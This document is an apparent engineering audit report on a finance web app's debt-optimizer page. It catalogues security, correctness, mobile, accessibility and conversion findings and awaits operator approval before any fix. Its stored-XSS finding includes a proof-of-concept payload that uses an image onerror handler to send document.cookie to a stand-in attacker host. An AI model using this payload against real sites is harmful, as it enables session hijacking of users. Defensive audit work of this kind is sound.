# /debt-optimizer page deep audit — 2026-05-24

**Scope:** `debt-optimizer.html` + `debt-optimizer-1.js` + `debt-optimizer-2.js` + `debt-optimizer-3.js` plus every file that touches `pfc_debts` / `pfc_debt_strategy`:
- `js/inline/dashboard-2.js` (read-only consumer of `name`, `balance`, `rate`, `minPay`/`minimum`)
- `js/pfc-storage.js` (encryption + legacy `pfc_debts` migration)
- `tools/debt-strategy.html` + `js/tools/debt-strategy-compare.js` (separate marketing tool — different field names, parallel engine — flagged as drift risk in D-WORTH-2)

**Audit method (5 parallel lens skills + skills-recommender disk-scrape — 33 skills mapped):**

| # | Lens | Primary skills | Findings |
|---|---|---|---|
| 1 | Cross-dependency mapping | `engineering-advanced-skills:focused-fix` + `tech-debt-tracker` + `api-design-reviewer` | 8 landmines |
| 2 | Functionality + bug-hunt | `systematic-debugging` + `debugging-wizard` | 18 (4 P0, 6 P1, 8 P2) |
| 3 | Design + perf + a11y | `critique` + `performance-analysis` + `ui-ux-pro-max` | 34 (4 P0, 13 P1, 10 P2) |
| 4 | Mobile + compat + security | `security-review` + `dependency-auditor` + `mobile-app` | 37 (10 P0, 13 P1, 14 P2) |
| 5 | CRO + worth-it | `page-cro` + `paywall-upgrade-cro` + `marketing-psychology` | 15 + 4 strategic |

**Total raw: 120 findings → deduplicated to ~60 unique.** Status: **AUDIT COMPLETE. NO FIXES APPLIED.** Awaiting operator approval before any code change.

---

## Cross-dependency map (READ FIRST)

The `pfc_debts` storage key has **1 writer** (debt-optimizer-2.js) and **2 readers** (debt-optimizer-2.js itself + `js/inline/dashboard-2.js:584`). Single-writer is GOOD — no schema-drift class like the historical `nw_history` 3-writer bug. But there are FOUR much worse landmines.

### THE LANDMINE #1 (P0 launch-blocker — same class as commit e9aa091)

> **Inline `onclick=` handlers injected via `innerHTML` on every render.**
>
> `debt-optimizer-2.js:293-294`:
> ```js
> <button onclick="editDebt(${d.origIdx})">Edit</button>
> <button onclick="deleteDebt(${d.origIdx})">Delete</button>
> ```
>
> Under prod CSP `script-src-elem 'self'` these handlers are **stripped silently → Edit + Delete go dead for every authenticated user with any debts.** Same exact class as the inline-script bug that failed E2E and was fixed in commit `e9aa091`. The rest of this HTML uses `data-pfc-on-click="..."` (lines 295, 348, 469) — the migration was never applied to JS-rendered rows.

### THE LANDMINE #2 (P0 stored-XSS — survives across devices via Supabase)

> **`d.name` interpolated RAW into innerHTML in 2 sinks.**
>
> - `debt-optimizer-2.js:461` (renderPayoffOrder): `<div ...>${d.name}</div>`
> - `debt-optimizer-2.js:439` (renderSchedule): `${row.event || '—'}` where `row.event` is built at line 145 as `d.name + ' cleared.'`
>
> Proof: save a debt named `<img src=x onerror="fetch('//attacker/'+document.cookie)">` via the modal. PFCStorage persists it → encrypted to Supabase. On every login on every device, the payload runs in profinancecast.com origin with full auth-session access. The other render sites (renderDebtList line 281) DO escape via escHtml — these two were missed.

### THE LANDMINE #3 (P0 — snowball cascade is broken, the headline algorithm)

> **The snowball/avalanche freed-minimum cascade never lands.**
>
> `debt-optimizer-2.js:130-151`. The extra-payment loop walks `sorted`, drains debt A to zero. THEN lines 142-151 detect A cleared and add `A.minPay` back to `monthlyExtra`. But the loop on 130 already broke (`monthlyExtra <= 0`); the freed minimum sits in a local `monthlyExtra` that goes out of scope at line 156. Next iteration, `monthlyExtra = extra` resets from the passed-in `extra`. **The cascade comment is aspirational, not implemented.** Every payoff timeline displayed is SLOWER than it should be. This is the headline feature of the optimiser.

### THE LANDMINE #4 (P0 — empty-state UI is destroyed on first render)

> **First add-then-delete leaves a blank card with no CTA.**
>
> `debt-optimizer.html:401-419` puts the rich `#empty-debts` (icon, photo, "Add your first debt" button) INSIDE `#debt-list`. `renderDebtList` line 299 does `listEl.innerHTML = '<div id="empty-debts" style="display:none;"></div>' + rows` — destroys the rich content. After delete, `renderAll` toggles `display='block'` on a zero-content div. User sees an empty card forever in the session.

### Schema drift + cross-tab landmines (P1)

- **`editDebt(idx)` / `deleteDebt(idx)` are array-index-keyed.** No stable `id` field on debt entries. Same class of bug as R-P0-1 (/recurring CANCELLED set) and G-P0-1 (goals milestones). If a concurrent `_rehydrateFromStorage` fires between render and click (sign-in adoption, second tab, demo seed), the user deletes the wrong debt.
- **Init double-run.** `init()` at module top + `PFCAuth.onReady` (diff-guarded) + `PFCAuth.onAuthChange` (UNGUARDED) — onAuthChange always fires after onReady on cold load → two full chart destroy/create cycles. Same as fixed on /recurring (R-PERF-12).
- **Silent auto-migration writes guest data.** debt-optimizer-2.js:26-35 — if a guest visits with `USER.debt > 0` (from onboarding) and no DEBTS, the page silently creates a fake "My debt" at 10% APR and writes to storage. After login, this lives forever in the real user's namespace. No toast, no undo.
- **Script-load-order trap.** Chart.js sync in head with explicit "no defer" comment (line 24-26). Nine other PFC head scripts sync (175-183). Body has 3 sync inline `<script src>` tags. EXACT DASH-PROD-FIX class — any future "defer everything" pass kills the chart.

---

## P0 — launch-blocking (10 unique findings)

| ID | Lens | File:line | What's broken | Fix skill |
|---|---|---|---|---|
| **D-P0-1** | Security + Bug | `debt-optimizer-2.js:293-294` | **Inline `onclick="editDebt(${d.origIdx})"` and `onclick="deleteDebt(...)"` injected via innerHTML.** CSP violation = Edit/Delete dead in production. Same class as e9aa091. | `security-review` → data-pfc-on-click + delegation |
| **D-P0-2** | Security | `debt-optimizer-2.js:461, 439, 145` | **Stored XSS via debt name.** Two raw `${d.name}` / `${row.event}` interpolations into innerHTML survive across devices via Supabase encryption layer. | `security-review` → escHtml() at every sink |
| **D-P0-3** | Bug | `debt-optimizer-2.js:130-151` | **Snowball/avalanche freed-minimum cascade is broken** — every payoff timeline is slower than displayed. Headline algo is wrong. | `systematic-debugging` → hoist `monthlyExtra` outside loop OR restructure as accumulator |
| **D-P0-4** | Bug + Design | `debt-optimizer-2.js:299` + `debt-optimizer.html:401-419` | **Empty-state UI destroyed on first render.** Add-then-delete leaves a blank card with no CTA for the rest of the session. | `systematic-debugging` → render to sibling div, not replace parent |
| **D-P0-5** | Bug | `debt-optimizer-2.js:113-127` | **Negative amortisation silent.** If `minPay < monthly interest`, debt grows unbounded to 600-month cap. UI shows "600 mo / Debt-free by [date]" — misleading; no banner. | `systematic-debugging` → guard at calcPayoff + visible banner |
| **D-P0-6** | Security | `debt-optimizer.html:175` | **Supabase CDN unpinned + no SRI.** `@supabase/supabase-js@2` floating. Same fix as NW-P1-5 / G-P1-E / R-P0-4 (pin `@2.105.4` + sha384). | `focused-fix` (1-line copy) |
| **D-P0-7** | Security | `debt-optimizer.html:191, 193, 198` | Sentry + Cloudflare insights + Plausible CDNs unpinned, no SRI. | `focused-fix` |
| **D-P0-8** | Mobile | `debt-optimizer.html:27-166 entirely` | **Zero `@media` breakpoints + no sidebar drawer.** 240px sidebar covers 64% of phone viewport, body `overflow:hidden` clips. Tables forced into 350px. Same class as dashboard pre-DASH-P0-2 + recurring pre-R-P0-10. | `focused-fix` → graft NW-P0-4 drawer pattern |
| **D-P0-9** | A11y | `debt-optimizer.html:505-577` | **Modal lacks role=dialog / aria-modal / aria-labelledby / focus trap.** Close is `<div>` not `<button>`. Strategy buttons are `<div>` not `<button>`. Inputs lack `for=`. Keyboard users locked out. | `focused-fix` → graft G-P1-C a11y pattern |
| **D-P0-10** | A11y + Design | `debt-optimizer.html:290` | **No `<h1>`.** topbar-title is a `<div>`. Document outline starts at `<h4>` in footer. SR heading-nav broken. | `focused-fix` (1-line) |

## P1 — correctness, polish, perf, a11y, CRO (~25 unique)

**Functionality (5):**
- D-BUG-6: `pay >= bal` (line 559) off-by-one rejects legitimate final payment. Should be `pay > bal`.
- D-BUG-7: No upper bound on balance/rate/minPay; `parseFloat` accepts `5e10`, `Infinity`-class strings → chart axis breaks, JSON bloat.
- D-BUG-10: `confirm("Delete '...'?)` (line 513) broken in iOS PWA standalone. Same class as R-P0-9.
- D-BUG-11: Index-keyed edit/delete drift after concurrent mutation (storage event from second tab, demo seed).
- D-BUG-12: CSV row breaks on debt names with comma/quote (line 477-478, no escape). No BOM for Excel.

**Security (3):**
- D-SEC-13: No `_safeParseJson` reviver on `getJSON('debts')` — prototype-pollution surface via tampered localStorage. Same as R-SEC-17.
- D-SEC-15: `alert()` + `confirm()` iOS-PWA broken (line 559 / 513) — same fix class as D-BUG-10 above + R-P0-9.
- D-SEC-14: `d.origIdx` template-injection surface — currently safe (integer index), but inline `onclick` is the second reason to ship D-P0-1.

**Cross-page (2):**
- D-XDEP-1: Cross-page contract `{name, balance, rate, minPay|minimum}` consumed by dashboard-2.js:584 — rename `minPay` → `minimum` would break dashboard. Document the contract.
- D-XDEP-2: `tools/debt-strategy.html` runs a parallel engine (`pfc-debt-engine.js` namespace) — drift risk. See D-WORTH-2.

**Perf (5):**
- D-PERF-5 (P0-leaning): `renderAll` runs on every slider `input` event (40 events on a single drag) → 5× full calcPayoff + chart destroy/recreate per tick. Needs debounce.
- D-PERF-6: 5× redundant calcPayoff per render (line 186-193) — `aval`/`opt` and `snow`/`opt` and `base`/`noExtra` are pairwise identical depending on STRATEGY/EXTRA.
- D-PERF-7: Chart destroy + new Chart on every render instead of `chart.data.* = ...; chart.update('none')`.
- D-PERF-3: 9 PFC head scripts sync — DASH-PROD-FIX class.
- D-PERF-4: Missing preconnect / dns-prefetch for 5 CDNs.

**Compat (4):**
- D-COMPAT-1: `100vh` no `100dvh` (sidebar + main).
- D-COMPAT-2: `backdrop-filter` no `-webkit-` prefix.
- D-COMPAT-3: Zero `env(safe-area-inset-*)`.
- D-COMPAT-9: No `prefers-reduced-motion` rules.

**A11y (8):**
- D-A11Y-2: No skip-link.
- D-A11Y-5: Modal inputs missing `for=` linkage.
- D-A11Y-6: Strategy `<div>` buttons (P0 fix scope but listed here for completeness).
- D-A11Y-7: Extra slider missing aria-label / aria-valuetext.
- D-A11Y-8: Chart canvas missing role=img + aria-label + sr-only fallback (same as R-A11Y-10).
- D-A11Y-9: Strategy/extra changes silent for SR (no aria-live).
- D-A11Y-10: Sidebar nav missing `aria-current="page"`.
- D-A11Y-12: Edit/Delete row buttons have no debt context for SR (need `aria-label="Edit {name}"`).

**Mobile (3):**
- D-MOB-5: `.modal-close` is 28×28 (< WCAG 44).
- D-MOB-6: Edit/Delete buttons ~22-25px tall.
- D-MOB-7: Numeric inputs missing `inputmode="decimal"`.

**CRO (5 retention-driving):**
- D-CRO-1: No "since last visit" pill.
- D-CRO-2: No "log a payment" affordance → real balance only mutates via Edit modal.
- D-CRO-4: No celebration when a real debt is paid off — `deleteDebt` toast is neutral "Removed — {name}".
- D-CRO-5: No goal-recovery cross-page framing (R-CRO-5 pattern on /recurring) — "After your last card clears, your freed €420/mo reaches Emergency Fund 7 months sooner."
- D-CRO-7: No "this month vs last month interest paid" micro-stat.

## P2 — polish (~20 unique)

**Design:** Emoji TYPE_COLORS (D-DES-2), 62 inline styles (D-DES-1), flat KPI strip with no hero (D-DES-3), color-only winner CSS (D-DES-8), strategy toggle weak active lock (D-DES-5), duplicated "← Dashboard" + sidebar (D-DES-6), empty-state photo premature (D-DES-7), no slider ticks (D-DES-9), modal field-row crowding (D-DES-10), sticky-header no shadow (D-DES-11), naming inconsistency "Debt strategy" vs "Debt Payoff Optimizer" (D-DES-12).

**Perf:** Date allocation in calcPayoff loop (D-PERF-9), JSON.stringify guard (D-PERF-10).

**Compat:** color-scheme:dark only on select (D-COMPAT-4), no Firefox slider prefix (D-COMPAT-5), no Firefox scrollbar styling (D-COMPAT-6), no `<noscript>` (D-COMPAT-7), no print stylesheet (D-COMPAT-8), no `forced-colors` rule (D-COMPAT-10).

**A11y:** No `:focus-visible` global rule (D-A11Y-11).

**Bug:** `interestSaved` dead code (D-BUG-14), unused `noExtra` redundant compute (D-BUG-13), chart-sampling endpoint label edge (D-BUG-17/18).

**CRO:** No PDF export (D-CRO-8), no email-plan (D-CRO-9), no refinance simulator (D-CRO-10), no scenario save/compare (D-CRO-11), no DTI surface (D-CRO-12), no Sage handoff button (D-CRO-14), Snowball "Proven" claim no citation (D-CRO-15).

---

## Strategic Worth-it section (operator decisions needed)

### D-WORTH-1 — Pro entitlement on /debt-optimizer (P0)
billing.html line 1339: `✓✓✓` Free/Pro/Founders. Same equal-Free-and-Pro problem as /recurring pre-CEO-batch. Recommendation matching prior CEO calls: keep avalanche/snowball + extra-slider + comparison + CSV-current-export **Free forever**; gate PDF report + email-plan + multi-scenario save + refinance simulator behind Pro.

### D-WORTH-2 — `/tools/debt-strategy.html` competing surface (P0)
Separate engine (`pfc-debt-engine.js`), separate field names (`apr` vs `rate`, `minimum` vs `minPay`), SEO-indexed (no noindex), Free, unauth. /debt-optimizer is `noindex,nofollow` + behind auth. Drift risk is real. **Operator decision:** consolidate onto a shared engine module OR explicitly differentiate (/tools = SEO funnel, /debt-optimizer = persistent state + advanced).

### D-WORTH-3 — Cross-page "freed cashflow → goals" loop (P1)
The R-CRO-5 pattern shipped on /recurring. Same data accessibility (USER + goals storage). Low-effort, high-leverage retention play.

### D-WORTH-4 — Empty-state "demo debt" button (P2)
Matches `loadDemo` on /recurring. First-time visitor experience without commitment.

### D-WORTH-5 — Killer-hook reframing (P1)
Current: "Total interest saved · vs minimum payments only" — neutral framing.
Recommended single-line hero above the strip:
> *"By paying €{EXTRA}/mo extra and switching to {STRATEGY}, you finish {months_faster} months earlier and keep €{interest_saved} that would have gone to interest."*
Data is already computed in `noExtra` vs `opt`. ~10 LOC + a hero band.

---

## Cross-page blast-radius warnings (lessons-learned discipline)

Before ANY fix touches:
- **`pfc_debts` schema** → 1 writer + dashboard-2.js:584 read (`name, balance, rate, minPay|minimum`). Don't rename `minPay` without updating dashboard. Don't make required-field-add break legacy entries.
- **`<script>` tags** → atomic defer (Chart.js + 9 PFC modules + 3 body scripts) per the DASH-PROD-FIX class.
- **Inline `onclick="editDebt(...)"`** → MUST convert to `data-pfc-on-click` delegation + escape `d.origIdx` (or better — migrate to stable id keys first).
- **`escHtml()`** → already defined in debt-optimizer-2.js:252; just needs to be APPLIED at every innerHTML site.
- **Storage key migration** → `pfc_debts` + `pfc_debt_strategy` already in pfc-storage.js LEGACY_KEYS. Safe.
- **Auth-aware rehydration** → both `onReady` (diff-guarded) and `onAuthChange` (unguarded) call _rehydrateFromStorage. The unguarded path is the cause of double-render. Same fix pattern as R-PERF-12 on /recurring.

---

## Recommended fix batches (mirrors prior page patterns)

**Batch P0 (apply first):**
- **Group A (security):** D-P0-1 inline-onclick → data-action, D-P0-2 escHtml on the 2 raw sinks, D-P0-6+7 SRI pin Supabase/Sentry/CF/Plausible, D-SEC-13 _safeParseJson
- **Group B (correctness):** D-P0-3 snowball cascade fix, D-P0-4 empty-state render fix, D-P0-5 negative-amortisation guard + banner
- **Group C (mobile):** D-P0-8 sidebar drawer + 540/800 breakpoints + table-card-fallback
- **Group D (a11y):** D-P0-9 modal a11y baseline + strategy `<button>` semantics + label-for, D-P0-10 h1 + skip-link
- **Decision required (no code):** D-WORTH-1 Pro entitlement choice, D-WORTH-2 /tools/debt-strategy consolidation choice

**Batch P1:** 25 fixes grouped by domain (correctness, security hardening, cross-page sync, perf, compat, mobile polish, a11y, CRO bundle)

**Batch P2:** 20 polish (62 inline-styles → CSS, emoji → SVG, compat layer, CRO surfaces)

**Awaiting operator approval to proceed.**
